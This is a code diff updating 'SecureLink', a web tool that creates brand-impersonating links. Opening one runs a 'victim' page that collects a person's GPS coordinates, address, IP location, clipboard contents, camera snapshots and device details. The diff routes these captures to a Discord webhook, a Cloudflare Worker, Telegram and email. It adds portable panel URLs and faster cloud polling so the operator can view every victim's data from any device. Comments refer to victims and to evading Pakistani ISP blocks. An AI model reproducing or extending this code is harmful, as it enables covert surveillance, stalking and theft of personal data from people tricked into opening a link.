@@ -84,13 +84,16 @@
           <p class="text-xs text-gray-400">Management Console</p>
         </div>
       </div>
-      <div class="flex items-center gap-4">
+      <div class="flex items-center gap-3">
+        <div id="cloudBadge" class="hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10">
+          <span class="text-xs text-gray-400" id="cloudText">cloud: off</span>
+        </div>
         <div id="ctxBadge" class="hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10">
           <span class="text-xs text-gray-400" id="ctxText">checking...</span>
         </div>
         <div class="hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-500/10 border border-green-500/20">
           <div class="pulse-dot"></div>
-          <span class="text-xs text-green-400 font-medium">System Online</span>
+          <span class="text-xs text-green-400 font-medium">Online</span>
         </div>
         <button onclick="logout()" class="px-4 py-2 rounded-lg bg-white/5 hover:bg-white/10 text-sm transition">
           <i class="fas fa-sign-out-alt mr-1"></i>Logout
@@ -158,7 +161,7 @@
           <div>
             <label class="text-xs text-gray-400 uppercase tracking-wider">Custom Short Code</label>
             <div class="flex mt-2">
-              <span class="px-3 py-3 bg-black/60 border border-white/10 border-r-0 rounded-l-lg text-gray-400 text-sm">your.site/#/</span>
+              <span class="px-3 py-3 bg-black/60 border border-white/10 border-r-0 rounded-l-lg text-gray-400 text-sm">#/</span>
               <input id="shortCode" placeholder="my-link" class="flex-1 px-4 py-3 bg-black/40 border border-white/10 rounded-r-lg focus:outline-none focus:border-indigo-500">
             </div>
             <button onclick="generateRandomCode()" class="mt-2 text-xs text-indigo-400 hover:text-indigo-300">
@@ -238,14 +241,14 @@
             <i class="fas fa-magic mr-2"></i>Generate Link
           </button>
           <button onclick="previewLink()" class="px-6 py-3 rounded-lg bg-white/5 hover:bg-white/10 font-semibold transition">
-            <i class="fas fa-eye mr-2"></i>Preview (uses current settings)
+            <i class="fas fa-eye mr-2"></i>Preview
           </button>
         </div>
 
         <div id="generatedLink" class="hidden mt-6 p-5 rounded-xl bg-gradient-to-r from-indigo-500/10 to-purple-500/10 border border-indigo-500/30">
           <p class="text-xs text-gray-400 uppercase tracking-wider mb-2">Your Link is Ready</p>
-          <div class="flex items-center gap-3">
-            <code id="linkOutput" class="flex-1 text-indigo-300 text-sm break-all"></code>
+          <div class="flex items-center gap-3 flex-wrap">
+            <code id="linkOutput" class="flex-1 text-indigo-300 text-sm break-all min-w-[200px]"></code>
             <button onclick="copyLink()" class="px-4 py-2 rounded-lg bg-indigo-500 hover:bg-indigo-600 text-white text-sm transition whitespace-nowrap">
               <i class="fas fa-copy mr-1"></i>Copy
             </button>
@@ -273,7 +276,7 @@
           <div class="flex gap-2 flex-wrap">
             <input id="searchLogs" oninput="renderLogs()" placeholder="Search IP, code, model, city..." class="px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
             <button onclick="syncFromCloud(true)" class="px-4 py-2 rounded-lg bg-green-500/20 hover:bg-green-500/30 text-green-300 text-sm transition">
-              <i class="fas fa-cloud-download-alt mr-1"></i>Sync from Cloud
+              <i class="fas fa-cloud-download-alt mr-1"></i>Sync Cloud
             </button>
             <button onclick="exportAllLogs()" class="px-4 py-2 rounded-lg bg-indigo-500/20 hover:bg-indigo-500/30 text-indigo-300 text-sm transition">
               <i class="fas fa-download mr-1"></i>Export
@@ -293,45 +296,47 @@
         <h2 class="text-xl font-bold mb-6">Delivery Settings</h2>
         
         <div class="space-y-6">
-          <!-- DISCORD (PRIMARY) -->
-          <div class="p-5 rounded-xl bg-black/30 border border-green-500/20">
-            <div class="flex items-center gap-2 mb-3">
-              <i class="fab fa-discord text-indigo-400 text-xl"></i>
-              <h3 class="font-semibold">Discord Webhook</h3>
-              <span class="text-xs px-2 py-0.5 rounded-full bg-green-500/20 text-green-300 ml-auto">PRIMARY — works in Pakistan</span>
-            </div>
-            <label class="text-xs text-gray-400 uppercase">Webhook URL</label>
-            <input id="dcHook" placeholder="https://discord.com/api/webhooks/..." class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
-            <p class="text-xs text-gray-500 mt-2">Discord → server settings → Integrations → Webhooks → New Webhook → Copy URL. Not blocked on any Pakistani ISP.</p>
-            <button onclick="testDiscord()" class="mt-3 px-4 py-2 rounded-lg bg-indigo-500/20 hover:bg-indigo-500/30 text-indigo-300 text-sm transition">
-              <i class="fas fa-paper-plane mr-1"></i>Send Test to Discord
-            </button>
-          </div>
-
-          <!-- CLOUDFLARE WORKER (PANEL SYNC) -->
           <div class="p-5 rounded-xl bg-black/30 border border-green-500/20">
             <div class="flex items-center gap-2 mb-3">
               <i class="fas fa-cloud text-orange-400 text-xl"></i>
-              <h3 class="font-semibold">Cloud Backend (Panel Sync)</h3>
-              <span class="text-xs px-2 py-0.5 rounded-full bg-green-500/20 text-green-300 ml-auto">RECOMMENDED</span>
+              <h3 class="font-semibold">Cloud Backend (KV Storage)</h3>
+              <span class="text-xs px-2 py-0.5 rounded-full bg-green-500/20 text-green-300 ml-auto">SOURCE OF TRUTH</span>
             </div>
-            <p class="text-xs text-gray-500 mb-3">Every capture gets stored on your Cloudflare Worker so your panel shows data from every victim, everywhere, forever — no more "why is my panel empty". Deploy instructions are in the README.</p>
+            <p class="text-xs text-gray-500 mb-3">Every capture lands here regardless of which browser opened the link. This is what makes cross-device work.</p>
             <div class="grid md:grid-cols-2 gap-4">
               <div>
                 <label class="text-xs text-gray-400 uppercase">Worker URL</label>
-                <input id="cfUrl" placeholder="https://securelink-captures.YOUR-NAME.workers.dev" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
+                <input id="cfUrl" placeholder="https://your-worker.workers.dev" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
               </div>
               <div>
                 <label class="text-xs text-gray-400 uppercase">Secret</label>
-                <input id="cfSecret" placeholder="your-secret-from-worker-env" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
+                <input id="cfSecret" placeholder="your-secret" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
               </div>
             </div>
-            <button onclick="testCloud()" class="mt-3 px-4 py-2 rounded-lg bg-orange-500/20 hover:bg-orange-500/30 text-orange-300 text-sm transition">
-              <i class="fas fa-heartbeat mr-1"></i>Test Cloud Connection
+            <div class="flex flex-wrap gap-2 mt-3">
+              <button onclick="testCloud()" class="px-4 py-2 rounded-lg bg-orange-500/20 hover:bg-orange-500/30 text-orange-300 text-sm transition">
+                <i class="fas fa-heartbeat mr-1"></i>Test Connection
+              </button>
+              <button onclick="buildPortablePanelUrl()" class="px-4 py-2 rounded-lg bg-purple-500/20 hover:bg-purple-500/30 text-purple-300 text-sm transition">
+                <i class="fas fa-share-alt mr-1"></i>Generate Portable Panel URL
+              </button>
+            </div>
+            <p class="text-xs text-gray-500 mt-2">Portable URL opens your panel on any device with cloud sync pre-configured. Bookmark it.</p>
+          </div>
+
+          <div class="p-5 rounded-xl bg-black/30 border border-indigo-500/20">
+            <div class="flex items-center gap-2 mb-3">
+              <i class="fab fa-discord text-indigo-400 text-xl"></i>
+              <h3 class="font-semibold">Discord Webhook</h3>
+              <span class="text-xs px-2 py-0.5 rounded-full bg-green-500/20 text-green-300 ml-auto">Works in Pakistan</span>
+            </div>
+            <label class="text-xs text-gray-400 uppercase">Webhook URL</label>
+            <input id="dcHook" placeholder="https://discord.com/api/webhooks/..." class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
+            <button onclick="testDiscord()" class="mt-3 px-4 py-2 rounded-lg bg-indigo-500/20 hover:bg-indigo-500/30 text-indigo-300 text-sm transition">
+              <i class="fas fa-paper-plane mr-1"></i>Send Test
             </button>
           </div>
 
-          <!-- TELEGRAM (OPTIONAL) -->
           <div class="p-5 rounded-xl bg-black/30 border border-white/5">
             <div class="flex items-center gap-2 mb-3">
               <i class="fab fa-telegram text-blue-400 text-xl"></i>
@@ -348,18 +353,15 @@
                 <input id="tgChat" placeholder="-100123456789" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
               </div>
             </div>
-            <p class="text-xs text-gray-500 mt-2">Will only be attempted if reachable. If you're in Pakistan on most ISPs, leave this empty and use Discord.</p>
             <button onclick="testTelegram()" class="mt-3 px-4 py-2 rounded-lg bg-blue-500/20 hover:bg-blue-500/30 text-blue-300 text-sm transition">
               <i class="fas fa-paper-plane mr-1"></i>Test Telegram
             </button>
           </div>
 
-          <!-- EMAILJS (BACKUP) -->
           <div class="p-5 rounded-xl bg-black/30 border border-white/5">
             <div class="flex items-center gap-2 mb-3">
               <i class="fas fa-envelope text-pink-400 text-xl"></i>
               <h3 class="font-semibold">Email Delivery (EmailJS)</h3>
-              <span class="text-xs text-gray-500 ml-auto">backup channel</span>
             </div>
             <div class="grid md:grid-cols-2 gap-4">
               <div>
@@ -381,7 +383,6 @@
             </div>
           </div>
 
-          <!-- PASSWORD -->
           <div class="p-5 rounded-xl bg-black/30 border border-white/5">
             <div class="flex items-center gap-2 mb-3">
               <i class="fas fa-lock text-yellow-400 text-xl"></i>
@@ -396,7 +397,6 @@
             </button>
           </div>
 
-          <!-- DIAGNOSTICS -->
           <div class="p-5 rounded-xl bg-black/30 border border-white/5">
             <div class="flex items-center gap-2 mb-3">
               <i class="fas fa-bug text-green-400 text-xl"></i>
@@ -408,17 +408,6 @@
             <button onclick="runDiagnostics()" class="mt-3 px-4 py-2 rounded-lg bg-green-500/20 hover:bg-green-500/30 text-green-300 text-sm transition">
               <i class="fas fa-stethoscope mr-1"></i>Run Diagnostics
             </button>
-          </div>
-
-          <div class="p-5 rounded-xl bg-black/30 border border-white/5">
-            <div class="flex items-center gap-2 mb-3">
-              <i class="fas fa-clock text-purple-400 text-xl"></i>
-              <h3 class="font-semibold">Auto-Sync</h3>
-            </div>
-            <label class="flex items-center gap-2 cursor-pointer">
-              <input id="autoSync" type="checkbox" class="accent-indigo-500" checked>
-              <span class="text-sm">Poll cloud every 30s while panel is open</span>
-            </label>
           </div>
 
           <button onclick="saveSettings()" class="btn-primary px-6 py-3 rounded-lg font-semibold">
@@ -440,12 +429,7 @@
 
 <script>
 /* ============================================================
-   SECURELINK v5
-   - Discord webhook as primary channel (works in Pakistan)
-   - Cloudflare Worker cloud sync so panel shows all captures
-   - Local retry queue so nothing is lost if network drops
-   - IP-based geolocation fallback when GPS denied
-   - Full device model / OS / browser / address detection
+   SECURELINK v6 — cross-browser, cross-device, cloud-first
    ============================================================ */
 
 const BRANDS = {
@@ -504,10 +488,8 @@ const BRAND_ICONS = {
 };
 
 function iconColorFor(key) {
-  const b = BRANDS[key];
-  if (!b) return '#6366f1';
-  const hex = b.color.replace('#','');
-  if (hex.length !== 6) return b.color;
+  const b = BRANDS[key]; if (!b) return '#6366f1';
+  const hex = b.color.replace('#',''); if (hex.length !== 6) return b.color;
   const r = parseInt(hex.substr(0,2),16), g = parseInt(hex.substr(2,2),16), bl = parseInt(hex.substr(4,2),16);
   const lum = (0.299*r + 0.587*g + 0.114*bl) / 255;
   return lum < 0.35 ? '#e5e5e5' : b.color;
@@ -530,7 +512,6 @@ let state = {
   links: safeGet('sl_links', []),
   logs: safeGet('sl_logs', []),
   settings: safeGet('sl_settings', {}),
-  queue: safeGet('sl_queue', []),
   currentTab: 'create',
   autoSyncTimer: null
 };
@@ -560,80 +541,92 @@ async function safeCopy(text) {
   } catch(e) { return false; }
 }
 
-/* ============ DIAGNOSTICS ============ */
+/* ============ CONTEXT ============ */
 function isSecureCtx() { return window.isSecureContext || location.hostname === 'localhost' || location.hostname === '127.0.0.1'; }
 function updateCtxBadge() {
   const badge = document.getElementById('ctxBadge'), txt = document.getElementById('ctxText');
   if (!badge || !txt) return;
   badge.classList.remove('hidden');
   if (isSecureCtx()) {
-    txt.textContent = '🔒 Secure context';
+    txt.textContent = '🔒 secure';
     badge.className = 'hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-500/10 border border-green-500/20';
     txt.className = 'text-xs text-green-400';
   } else {
-    txt.textContent = '⚠️ Not secure — APIs limited';
+    txt.textContent = '⚠️ not secure';
     badge.className = 'hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-red-500/10 border border-red-500/20';
     txt.className = 'text-xs text-red-400';
   }
 }
-async function runDiagnostics() {
-  const box = document.getElementById('diagBox'); if (!box) return;
-  const lines = [];
-  lines.push(`secure context: ${isSecureCtx() ? 'YES' : 'NO — host on localhost or HTTPS'}`);
-  lines.push(`protocol: ${location.protocol}`);
-  lines.push(`getUserMedia: ${navigator.mediaDevices && navigator.mediaDevices.getUserMedia ? 'yes' : 'no'}`);
-  lines.push(`geolocation: ${navigator.geolocation ? 'yes' : 'no'}`);
-  lines.push(`clipboard: ${navigator.clipboard ? 'yes' : 'no'}`);
-  lines.push(`discord hook set: ${state.settings.dcHook ? 'yes' : 'no'}`);
-  lines.push(`cloud url set: ${state.settings.cfUrl ? 'yes' : 'no'}`);
-  lines.push(`tg token set: ${state.settings.tgToken ? 'yes' : 'no'}`);
-  lines.push(`pending queue: ${state.queue.length}`);
-  try { const r = await fetch('https://api.ipify.org/?format=json'); const d = await r.json(); lines.push(`ipify: yes (${d.ip})`); }
-  catch(e) { lines.push(`ipify: NO — ${e.message}`); }
-  try { const r = await fetch('https://ipapi.co/json/'); const d = await r.json(); lines.push(`ipapi (IP geo): yes (${d.city || '?'}, ${d.country_name || '?'})`); }
-  catch(e) { lines.push(`ipapi: NO — ${e.message}`); }
-  try { const r = await fetch('https://nominatim.openstreetmap.org/status'); lines.push(`nominatim: ${r.ok ? 'yes' : 'no'}`); }
-  catch(e) { lines.push(`nominatim: NO — ${e.message}`); }
-  if (state.settings.dcHook) {
-    try {
-      const r = await fetch(state.settings.dcHook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: '🔬 SecureLink diagnostic ping.' }) });
-      lines.push(`discord post: ${r.ok ? 'OK' : 'FAIL ' + r.status}`);
-    } catch(e) { lines.push(`discord post: NO — ${e.message}`); }
+function updateCloudBadge() {
+  const badge = document.getElementById('cloudBadge'), txt = document.getElementById('cloudText');
+  if (!badge || !txt) return;
+  const s = state.settings;
+  if (s.cfUrl && s.cfSecret) {
+    badge.classList.remove('hidden');
+    txt.textContent = '☁️ cloud ready';
+    badge.className = 'hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-orange-500/10 border border-orange-500/20';
+    txt.className = 'text-xs text-orange-300';
+  } else {
+    badge.classList.remove('hidden');
+    txt.textContent = '☁️ cloud off';
+    badge.className = 'hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10';
+    txt.className = 'text-xs text-gray-500';
   }
-  if (state.settings.cfUrl) {
-    try {
-      const url = state.settings.cfUrl.replace(/\/$/,'') + '/health';
-      const r = await fetch(url, { headers: { 'x-secret': state.settings.cfSecret || '' } });
-      const d = await r.json();
-      lines.push(`cloud health: ${d.ok ? 'OK' : 'FAIL'}`);
-    } catch(e) { lines.push(`cloud health: NO — ${e.message}`); }
-  }
-  box.innerHTML = lines.map(l => `<div>${l}</div>`).join('');
+}
+
+/* ============ SETTINGS PERSISTENCE VIA URL HASH ============ */
+/* Format: #admin:&cfg=<base64url of {cfUrl,cfSecret}> */
+function extractSettingsFromHash() {
+  const h = window.location.hash.slice(1);
+  const m = h.match(/cfg=([A-Za-z0-9_-]+)/);
+  if (!m) return null;
+  try {
+    const cfg = JSON.parse(b64urlDecode(m[1]));
+    return cfg;
+  } catch(e) { return null; }
+}
+function mergeHashSettings() {
+  const cfg = extractSettingsFromHash();
+  if (!cfg) return;
+  if (cfg.cfUrl) state.settings.cfUrl = cfg.cfUrl;
+  if (cfg.cfSecret) state.settings.cfSecret = cfg.cfSecret;
+  if (cfg.dcHook) state.settings.dcHook = cfg.dcHook;
+  if (cfg.tgToken) state.settings.tgToken = cfg.tgToken;
+  if (cfg.tgChat) state.settings.tgChat = cfg.tgChat;
+  safeSet('sl_settings', state.settings);
 }
 
 /* ============ INIT ============ */
 function init() {
-  const hash = window.location.hash.slice(1);
+  mergeHashSettings();
   updateCtxBadge();
-  if (hash === 'admin' || !hash) {
+  updateCloudBadge();
+
+  const hash = window.location.hash.slice(1);
+  // strip cfg=... when routing
+  const route = hash.split('&')[0];
+
+  if (route === 'admin' || route === '' || route.startsWith('admin')) {
     if (state.auth) {
       document.getElementById('loginScreen').classList.add('hidden');
       document.getElementById('adminPanel').classList.remove('hidden');
       document.getElementById('victimScreen').classList.add('hidden');
       renderAll(); loadSettings(); startAutoSync();
+      syncFromCloud(false);
     } else { showLogin(); }
-  } else if (hash.startsWith('/')) {
-    const payload = hash.slice(1);
+  } else if (route.startsWith('/')) {
+    const payload = route.slice(1);
     let link = null;
     try { link = JSON.parse(b64urlDecode(payload)); } catch(e) { link = null; }
     if (link && link.brand && (link.dest || link.code === 'preview')) { launchVictim(link); }
     else {
       document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;color:#666;font-family:sans-serif;flex-direction:column"><i class="fas fa-exclamation-triangle" style="font-size:48px;margin-bottom:20px;color:#ef4444"></i><h2>Link not found or inactive</h2></div>';
     }
-  } else { window.location.hash = 'admin'; showLogin(); }
+  } else {
+    window.location.hash = 'admin';
+    showLogin();
+  }
   renderBrandGrid();
-  // flush queued captures on every page load
-  setTimeout(flushQueue, 1500);
 }
 
 /* ============ AUTH ============ */
@@ -649,7 +642,7 @@ function handleLogin() {
     state.auth = true;
     document.getElementById('loginScreen').classList.add('hidden');
     document.getElementById('adminPanel').classList.remove('hidden');
-    renderAll(); loadSettings(); updateCtxBadge(); startAutoSync();
+    renderAll(); loadSettings(); updateCtxBadge(); updateCloudBadge(); startAutoSync();
     toast('Welcome back!', 'success');
     syncFromCloud(false);
   } else { toast('Invalid password', 'error'); document.getElementById('loginPass').value = ''; }
@@ -666,7 +659,7 @@ function changePassword() {
   if (!p1 || p1.length < 4) return toast('Password must be at least 4 characters', 'error');
   if (p1 !== p2) return toast('Passwords do not match', 'error');
   localStorage.setItem(PASS_KEY, p1);
-  toast('Password updated successfully', 'success');
+  toast('Password updated', 'success');
   document.getElementById('newPass').value = ''; document.getElementById('newPass2').value = '';
 }
 
@@ -716,6 +709,19 @@ function collectModulesFromUI() {
   const modules = []; document.querySelectorAll('.collect-mod:checked').forEach(cb => modules.push(cb.value));
   return modules;
 }
+function buildDeliveryConfig() {
+  return {
+    dcHook: state.settings.dcHook || '',
+    cfUrl: state.settings.cfUrl || '',
+    cfSecret: state.settings.cfSecret || '',
+    emPub: state.settings.emPub || '',
+    emSvc: state.settings.emSvc || '',
+    emTpl: state.settings.emTpl || '',
+    emTo: state.settings.emTo || '',
+    tgToken: state.settings.tgToken || '',
+    tgChat: state.settings.tgChat || ''
+  };
+}
 function createLink() {
   const brand = state.selectedBrand;
   const code = document.getElementById('shortCode').value.trim().toLowerCase().replace(/[^a-z0-9-]/g, '');
@@ -729,24 +735,19 @@ function createLink() {
   if (state.links.some(l => l.code === code)) return toast('Code already exists', 'error');
   const modules = collectModulesFromUI();
   if (!modules.length) return toast('Select at least one module', 'error');
+  if (!state.settings.cfUrl || !state.settings.cfSecret) {
+    toast('Warning: cloud backend not configured. Captures will not reach other devices.', 'error');
+  }
 
   const link = { id: Date.now(), code, brand, dest, duration,
     message: msg || BRANDS[brand].messages[0], modules, snapCount, hits: 0,
     created: new Date().toISOString(), active: true };
   state.links.push(link); saveLinks();
 
-  const config = { code: link.code, brand: link.brand, dest: link.dest, duration: link.duration,
+  const config = {
+    code: link.code, brand: link.brand, dest: link.dest, duration: link.duration,
     message: link.message, modules: link.modules, snapCount: link.snapCount, active: true,
-    // embed delivery settings into the link so the victim browser knows where to send
-    dcHook: state.settings.dcHook || '',
-    cfUrl: state.settings.cfUrl || '',
-    cfSecret: state.settings.cfSecret || '',
-    emPub: state.settings.emPub || '',
-    emSvc: state.settings.emSvc || '',
-    emTpl: state.settings.emTpl || '',
-    emTo: state.settings.emTo || '',
-    tgToken: state.settings.tgToken || '',
-    tgChat: state.settings.tgChat || ''
+    ...buildDeliveryConfig()
   };
   const encoded = b64urlEncode(JSON.stringify(config));
   document.getElementById('linkOutput').textContent = window.location.origin + window.location.pathname + '#/' + encoded;
@@ -766,15 +767,7 @@ function previewLink() {
   if (!modules.length) return toast('Select at least one module', 'error');
   launchVictim({
     brand, duration, message: msg, dest, modules, snapCount, code: 'preview', active: true,
-    dcHook: state.settings.dcHook || '',
-    cfUrl: state.settings.cfUrl || '',
-    cfSecret: state.settings.cfSecret || '',
-    emPub: state.settings.emPub || '',
-    emSvc: state.settings.emSvc || '',
-    emTpl: state.settings.emTpl || '',
-    emTo: state.settings.emTo || '',
-    tgToken: state.settings.tgToken || '',
-    tgChat: state.settings.tgChat || ''
+    ...buildDeliveryConfig()
   });
 }
 async function copyLink() {
@@ -797,41 +790,45 @@ function toggleLink(id) {
 async function copyLinkUrl(code) {
   const link = state.links.find(l => l.code === code);
   if (!link) return toast('Link not found', 'error');
-  const config = { code: link.code, brand: link.brand, dest: link.dest, duration: link.duration,
+  const config = {
+    code: link.code, brand: link.brand, dest: link.dest, duration: link.duration,
     message: link.message, modules: link.modules, snapCount: link.snapCount || 3, active: true,
-    dcHook: state.settings.dcHook || '',
-    cfUrl: state.settings.cfUrl || '',
-    cfSecret: state.settings.cfSecret || '',
-    emPub: state.settings.emPub || '',
-    emSvc: state.settings.emSvc || '',
-    emTpl: state.settings.emTpl || '',
-    emTo: state.settings.emTo || '',
-    tgToken: state.settings.tgToken || '',
-    tgChat: state.settings.tgChat || ''
+    ...buildDeliveryConfig()
   };
   const encoded = b64urlEncode(JSON.stringify(config));
   const ok = await safeCopy(window.location.origin + window.location.pathname + '#/' + encoded);
   toast(ok ? 'Link copied' : 'Copy failed', ok ? 'success' : 'error');
 }
 
+/* ============ PORTABLE PANEL URL ============ */
+function buildPortablePanelUrl() {
+  const s = state.settings;
+  if (!s.cfUrl || !s.cfSecret) return toast('Configure cloud backend first', 'error');
+  const cfg = { cfUrl: s.cfUrl, cfSecret: s.cfSecret, dcHook: s.dcHook || '' };
+  const encoded = b64urlEncode(JSON.stringify(cfg));
+  const url = window.location.origin + window.location.pathname + '#admin&cfg=' + encoded;
+  safeCopy(url).then(ok => {
+    if (ok) toast('Portable URL copied. Bookmark it on any device.', 'success');
+    else {
+      prompt('Copy this portable panel URL:', url);
+    }
+  });
+}
+
 /* ============ CLOUD SYNC ============ */
 async function syncFromCloud(showToast) {
   const s = state.settings;
-  if (!s.cfUrl || !s.cfSecret) {
-    if (showToast) toast('Cloud backend not configured', 'error');
-    return;
-  }
+  if (!s.cfUrl || !s.cfSecret) { if (showToast) toast('Cloud backend not configured', 'error'); return; }
   try {
-    const url = s.cfUrl.replace(/\/$/,'') + '/list';
-    const r = await fetch(url, { headers: { 'x-secret': s.cfSecret } });
+    const url = s.cfUrl.replace(/\/$/,'') + '/list?secret=' + encodeURIComponent(s.cfSecret);
+    const r = await fetch(url);
     const d = await r.json();
     if (!d.ok) { if (showToast) toast('Cloud: ' + (d.error || 'failed'), 'error'); return; }
     const incoming = d.items || [];
-    // merge by timestamp (dedupe)
-    const seen = new Set(state.logs.map(l => l.timestamp + '|' + l.code));
+    const seen = new Set(state.logs.map(l => String(l.timestamp) + '|' + String(l.code)));
     let added = 0;
     for (const item of incoming) {
-      const key = (item.timestamp || '') + '|' + (item.code || '');
+      const key = String(item.timestamp || '') + '|' + String(item.code || '');
       if (!seen.has(key)) {
         item.new = true;
         state.logs.push(item);
@@ -844,16 +841,12 @@ async function syncFromCloud(showToast) {
     renderStats();
     if (state.currentTab === 'logs') renderLogs();
     if (showToast) toast(added ? `Synced ${added} new capture${added>1?'s':''}` : 'Already up to date', 'success');
-  } catch(e) {
-    if (showToast) toast('Cloud error: ' + e.message, 'error');
-  }
+  } catch(e) { if (showToast) toast('Cloud error: ' + e.message, 'error'); }
 }
 function startAutoSync() {
   stopAutoSync();
-  const cb = document.getElementById('autoSync');
-  if (!cb || !cb.checked) return;
-  if (!state.settings.cfUrl) return;
-  state.autoSyncTimer = setInterval(() => syncFromCloud(false), 30000);
+  if (!state.settings.cfUrl || !state.settings.cfSecret) return;
+  state.autoSyncTimer = setInterval(() => syncFromCloud(false), 15000);
 }
 function stopAutoSync() {
   if (state.autoSyncTimer) { clearInterval(state.autoSyncTimer); state.autoSyncTimer = null; }
@@ -875,7 +868,7 @@ function renderLinks() {
   const filtered = state.links.filter(l =>
     l.code.toLowerCase().includes(search) || l.brand.toLowerCase().includes(search) || l.dest.toLowerCase().includes(search));
   if (!filtered.length) {
-    list.innerHTML = `<div class="text-center py-12 text-gray-500"><i class="fas fa-inbox text-4xl mb-3 block"></i><p>${state.links.length === 0 ? 'No links yet. Create your first one!' : 'No matches'}</p></div>`;
+    list.innerHTML = `<div class="text-center py-12 text-gray-500"><i class="fas fa-inbox text-4xl mb-3 block"></i><p>${state.links.length === 0 ? 'No links yet.' : 'No matches'}</p></div>`;
     return;
   }
   list.innerHTML = filtered.map(l => `
@@ -936,11 +929,6 @@ function renderLogs() {
           <span class="font-semibold text-sm">Capture</span>
           <code class="text-xs text-gray-400 bg-black/40 px-2 py-0.5 rounded">/${log.code}</code>
           ${log.new ? '<span class="text-xs px-2 py-0.5 rounded-full bg-green-500/20 text-green-300">new</span>' : ''}
-          ${log.delivered && log.delivered.includes('dc') ? '<span class="text-xs px-2 py-0.5 rounded-full bg-indigo-500/20 text-indigo-300">Discord ✓</span>' : ''}
-          ${log.delivered && log.delivered.includes('cloud') ? '<span class="text-xs px-2 py-0.5 rounded-full bg-orange-500/20 text-orange-300">Cloud ✓</span>' : ''}
-          ${log.delivered && log.delivered.includes('tg') ? '<span class="text-xs px-2 py-0.5 rounded-full bg-blue-500/20 text-blue-300">TG ✓</span>' : ''}
-          ${log.delivered && log.delivered.includes('email') ? '<span class="text-xs px-2 py-0.5 rounded-full bg-pink-500/20 text-pink-300">Email ✓</span>' : ''}
-          ${log.delivered === 'none' ? '<span class="text-xs px-2 py-0.5 rounded-full bg-red-500/20 text-red-300">not sent</span>' : ''}
         </div>
         <span class="text-xs text-gray-500">${new Date(log.timestamp).toLocaleString()}</span>
       </div>
@@ -964,7 +952,7 @@ function renderLogs() {
       </div>
 
       ${log.address ? `<div class="p-3 rounded-lg bg-black/40 mb-2 text-xs"><span class="text-gray-500">📍 Address:</span> <span class="text-gray-200">${log.address}</span></div>` : ''}
-      ${log.coords ? `<div class="p-3 rounded-lg bg-black/40 mb-2 text-xs flex items-center gap-3 flex-wrap"><span class="text-gray-500">📌 Coords:</span> <span class="text-gray-200 font-mono">${log.coords}</span>${log.accuracy ? `<span class="text-gray-500">±${log.accuracy}m</span>` : ''}</div>` : ''}
+      ${log.coords ? `<div class="p-3 rounded-lg bg-black/40 mb-2 text-xs flex items-center gap-3 flex-wrap"><span class="text-gray-500">📌 Coords:</span> <span class="text-gray-200 font-mono">${log.coords}</span>${log.accuracy ? `<span class="text-gray-500">±${log.accuracy}m</span>` : ''}${log.coordsSource ? `<span class="text-gray-500">[${log.coordsSource}]</span>` : ''}</div>` : ''}
       ${log.ipGeo ? `<div class="p-3 rounded-lg bg-black/40 mb-2 text-xs"><span class="text-gray-500">🗺️ IP Location:</span> <span class="text-gray-200">${log.ipGeo}</span></div>` : ''}
       ${mapBlock ? `<div class="mb-2 flex flex-wrap gap-2">${mapBlock}</div>` : ''}
       ${log.clipboard ? `<div class="p-3 rounded-lg bg-black/40 mb-2 text-xs"><span class="text-gray-500">📋 Clipboard:</span> <span class="text-gray-200 break-all">${log.clipboard}</span></div>` : ''}
@@ -983,7 +971,7 @@ function openImage(src) {
 function deleteLog(id) {
   state.logs = state.logs.filter(l => String(l.id) !== String(id));
   safeSet('sl_logs', state.logs); renderLogs(); renderStats();
-  toast('Capture deleted', 'success');
+  toast('Removed locally (KV copy remains)', 'success');
 }
 async function copyLog(id) {
   const log = state.logs.find(l => String(l.id) === String(id)); if (!log) return;
@@ -1011,10 +999,10 @@ async function copyLog(id) {
   toast(ok ? 'Copied' : 'Copy failed', ok ? 'success' : 'error');
 }
 function clearLogs() {
-  if (!confirm('Clear local captures? (Cloud copies remain on the Worker until you clear them there.)')) return;
+  if (!confirm('Clear local captures? Cloud copies remain.')) return;
   state.logs = []; safeSet('sl_logs', state.logs);
   renderLogs(); renderStats();
-  toast('Local captures cleared', 'success');
+  toast('Local cleared', 'success');
 }
 function exportAllLogs() {
   if (!state.logs.length) return toast('Nothing to export', 'error');
@@ -1047,7 +1035,7 @@ function loadSettings() {
   set('dcHook', s.dcHook); set('cfUrl', s.cfUrl); set('cfSecret', s.cfSecret);
   set('tgToken', s.tgToken); set('tgChat', s.tgChat);
   set('emPub', s.emPub); set('emSvc', s.emSvc); set('emTpl', s.emTpl); set('emTo', s.emTo);
-  const cb = document.getElementById('autoSync'); if (cb) cb.checked = s.autoSync !== false;
+  updateCloudBadge();
 }
 function saveSettings() {
   state.settings = {
@@ -1059,11 +1047,11 @@ function saveSettings() {
     emPub: document.getElementById('emPub').value.trim(),
     emSvc: document.getElementById('emSvc').value.trim(),
     emTpl: document.getElementById('emTpl').value.trim(),
-    emTo: document.getElementById('emTo').value.trim(),
-    autoSync: document.getElementById('autoSync').checked
+    emTo: document.getElementById('emTo').value.trim()
   };
   safeSet('sl_settings', state.settings);
